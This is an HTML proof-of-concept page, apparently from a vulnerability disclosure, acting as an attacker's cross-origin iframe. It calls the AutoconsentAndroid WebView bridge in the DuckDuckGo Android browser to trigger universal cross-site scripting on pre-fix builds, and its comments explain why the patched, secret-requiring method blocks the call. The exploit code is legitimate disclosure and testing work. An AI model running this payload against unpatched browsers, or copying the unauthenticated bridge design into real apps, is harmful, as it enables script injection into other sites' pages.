<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>UXSS PoC — Attacker iframe</title>
  <style>
    body { font-family: monospace; background: #1a1a1a; color: #ccc; padding: 20px; margin: 0; font-size: 0.85rem; }
    h1   { color: #f44336; font-size: 1rem; }
    .ok  { color: #4caf50; }
    .err { color: #f44336; }
    .info{ color: #2196f3; }
    .warn{ color: #ff9800; }
    .banner { background: #3e2723; border: 1px solid #f44336; border-radius: 4px; padding: 10px; margin-bottom: 14px; color: #ffccbc; font-size: 0.9rem; }
    pre  { background: #111; padding: 10px; border-radius: 4px; word-wrap: break-word; white-space: pre-wrap; }
    #log { list-style: none; padding: 0; margin: 0; }
    #log li { margin: 3px 0; }
  </style>
</head>
<body>

  <h1>☠️  UXSS PoC — Attacker iframe (Autoconsent)</h1>

  <!--
    ══════════════════════════════════════════════════════════════════════
    WHY THIS PoC DOES NOT WORK ON THE CURRENT BUILD
    ══════════════════════════════════════════════════════════════════════

    The vulnerability this page targets has been FIXED in this repository.

    PRE-FIX (vulnerable) method signature:
      @JavascriptInterface
      fun process(message: String)          ← one arg, no secret

    CURRENT (fixed) method signature:
      @JavascriptInterface
      fun process(message: String, secret: String)   ← two args, secret required

    When this page calls AutoconsentAndroid.process(initPayload) with ONE
    argument, Android WebView's bridge finds NO matching one-arg method.
    The call is silently dropped — no UXSS occurs.

    Even calling process(initPayload, '') with two args fails: the empty
    string does not match the per-session UUID stored server-side, so the
    secret check returns immediately.

    The interface IS accessible from this cross-origin iframe (SOP does not
    protect @JavascriptInterface methods) — but the fix makes it useless
    without the correct per-session secret, which this iframe cannot obtain
    because window.autoconsentAndroidSecret lives in the parent frame and
    SOP prevents cross-origin reads.
    ══════════════════════════════════════════════════════════════════════
  -->

  <div class="banner">
    ⚠️ <strong>NOTE:</strong> This PoC targets the <em>pre-fix</em> (vulnerable) version of
    <code>AutoconsentInterface</code>. The current codebase already has the fix applied
    (<code>process(message, secret)</code> — two args required). The attack calls below
    will be silently dropped. See README for details.
  </div>

  <ul id="log"></ul>

  <script>
    /* ====================================================================
       UXSS Proof-of-Concept — Attacker's cross-origin iframe

       Target vulnerability: AutoconsentInterface (pre-fix)
       Pre-fix bridge method:  AutoconsentAndroid.process(message)  ← one arg
       Current (fixed) method: AutoconsentAndroid.process(message, secret)

       WHY THE ATTACK FAILS ON THE CURRENT BUILD:
       ===========================================
       The fixed method requires a second argument: a per-session UUID secret
       that is injected only into the MAIN FRAME's JS context. Cross-origin
       iframes cannot read window.autoconsentAndroidSecret from the parent
       frame (Same-Origin Policy blocks the read).

       When this page calls process(payload) with ONE arg, Android's WebView
       bridge looks for a @JavascriptInterface method named "process" that
       accepts exactly one String. It finds the two-arg method instead.
       On some Android versions this throws; on others it's a silent no-op.
       Either way, the UXSS payload is never executed.

       The interface itself IS callable from cross-origin frames — this is
       the core design flaw that the vulnerability class exploits. The fix
       adds a credential layer on top that cross-origin frames can't bypass.
       ==================================================================== */

    function log(msg, cls) {
      var li = document.createElement('li');
      li.className = cls || '';
      li.innerHTML = '[' + new Date().toISOString() + '] ' + msg;
      document.getElementById('log').appendChild(li);
      /* Report status to victim page for UI feedback (postMessage is cross-origin-safe). */
      window.parent.postMessage({ pocType: 'attacker-status', text: msg }, '*');
    }

    /* ── Phase 1: Verify we are inside the right browser ─────────────── */
    log('Attacker iframe loaded. Checking for AutoconsentAndroid interface…', 'info');

    setTimeout(function () {

      if (typeof AutoconsentAndroid === 'undefined') {
        log(
          '<span class="err">AutoconsentAndroid NOT found.</span> ' +
          'Are you running this in the <strong>DuckDuckGo Android browser</strong>? ' +
          'The interface is only injected by the app — it will not appear in desktop browsers.',
          'err'
        );
        return;
      }

      log('<span class="ok">AutoconsentAndroid interface FOUND</span> — bridge IS accessible from this cross-origin iframe (SOP does not block @JavascriptInterface calls).', 'ok');

      var victimUrl = document.referrer || 'http://localhost:8080/victim.html';
      log('Parent page URL (document.referrer): ' + victimUrl, 'info');

      var initPayload = JSON.stringify({ type: 'init', url: victimUrl });
      log('Crafting init payload: <code>' + initPayload + '</code>', 'info');

      /* ── VULNERABLE PATH (pre-fix): one argument, no secret required ── *
       * On the UNPATCHED version, this would trigger InitMessageHandlerPlugin,
       * which would call webView.evaluateJavascript() in the MAIN FRAME's
       * context — a full UXSS.
       *
       * On the CURRENT (patched) build, the one-arg method no longer exists.
       * Android WebView finds no matching signature → call is silently dropped.
       * ─────────────────────────────────────────────────────────────────── */
      try {
        AutoconsentAndroid.process(initPayload);
        log(
          '<span class="warn">process(message) call returned without throwing.</span> ' +
          'On the PATCHED build this is a silent no-op (no matching one-arg method). ' +
          'No UXSS is executed. ' +
          'On the VULNERABLE (pre-fix) build this would trigger UXSS — watch victim.html evidence log.',
          'warn'
        );
      } catch (e) {
        log('process(message) threw (expected on patched build): ' + e.message, 'info');
      }

      /* ── FIXED PATH: two args, empty secret (will be rejected by secret check) ── */
      setTimeout(function () {
        try {
          AutoconsentAndroid.process(initPayload, '');
          log(
            'process(message, "") returned (two args, empty secret). ' +
            'Patched build: silent reject — empty string ≠ per-session UUID. No UXSS.',
            'warn'
          );
        } catch (e) {
          log('process(message, "") threw: ' + e.message, 'info');
        }

        /* NOTE: We do NOT attempt to read window.top.autoconsentAndroidSecret.
           Cross-origin reads of any frame window property throw a SecurityError
           ("Blocked a frame with origin X from accessing a cross-origin frame").
           That error is correct and expected — it proves the secret is protected.
           But attempting it here produces a confusing message that looks like the
           PoC itself crashed, not like expected SOP enforcement. */
        log(
          'Summary: AutoconsentAndroid interface IS accessible from this cross-origin iframe. ' +
          'The ATTACK fails only because the fix requires a secret this iframe cannot obtain. ' +
          'See victim.html log — if UXSS evidence appeared there, the build is VULNERABLE.',
          'info'
        );
      }, 300);

    }, 500);
  </script>

</body>
</html>
